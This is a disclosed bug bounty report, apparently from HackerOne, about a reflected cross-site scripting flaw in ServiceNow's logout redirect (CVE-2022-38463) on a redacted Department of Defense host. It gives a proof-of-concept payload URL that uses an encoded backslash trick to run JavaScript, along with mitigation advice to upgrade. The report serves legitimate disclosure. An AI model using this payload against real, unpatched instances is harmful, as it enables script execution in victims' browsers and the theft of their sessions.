# XSS in ServiceNow logout https://████:443

## Report Details
- **Report ID**: 1699855
- **URL**: https://hackerone.com/reports/1699855
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-09-14T10:48:09.109Z
- **Disclosed**: 2023-05-15T15:14:43.122Z

## Reporter
- **Username**: colemanj
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
XSS in ServiceNow logout 
https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
## References
https://nvd.nist.gov/vuln/detail/CVE-2022-38463

## Impact

Unauthenticated remote attacker can execute code in user's browser context.  User must click on malicious link

## System Host(s)
███████

## Affected Product(s) and Version(s)
Servicenow prior to SanDiego SP6

## CVE Numbers
CVE-2022-38463

## Steps to Reproduce
Click on https://█████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)

## Suggested Mitigation/Remediation Actions
Upgrade to patched version of ServiceNow



## Attachments
No attachments
